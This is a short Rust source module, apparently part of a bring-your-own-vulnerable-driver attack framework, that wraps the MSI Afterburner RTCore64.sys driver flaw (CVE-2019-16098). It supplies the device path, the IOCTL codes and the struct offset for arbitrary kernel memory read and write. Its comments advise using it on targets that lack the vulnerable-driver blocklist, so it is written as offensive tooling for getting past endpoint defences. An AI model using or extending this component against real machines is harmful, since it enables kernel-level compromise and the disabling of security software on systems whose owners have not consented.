//! RTCore64.sys — MSI Afterburner (CVE-2019-16098).
//!
//! **Status: heavily blocklisted.** On every EDR blocklist since 2020.
//! Use only on legacy targets without vulnerable-driver blocklist enabled.
//!
//! Device: `\\.\RTCore64`
//! Read:  0x80002048
//! Write: 0x8000204C
//! Layout: 48-byte MemoryOperation, address at offset 0x08.

use crate::byovd::VulnDriverIoctl;

pub struct RtCore64;

impl VulnDriverIoctl for RtCore64 {
    fn device_path(&self) -> &[u16] {
        static PATH: [u16; 12] = [
            '\\' as u16, '\\' as u16, '.' as u16, '\\' as u16,
            'R' as u16, 'T' as u16, 'C' as u16, 'o' as u16,
            'r' as u16, 'e' as u16, '6' as u16, '4' as u16,
        ];
        &PATH
    }
    fn read_ioctl(&self) -> u32 { 0x80002048 }
    fn write_ioctl(&self) -> u32 { 0x8000204C }
    fn addr_offset(&self) -> usize { 0x08 }
    fn blocklist_status(&self) -> &'static str {
        "BLOCKLISTED: on all major EDR + Microsoft Vulnerable Driver Blocklist since 2020"
    }
}
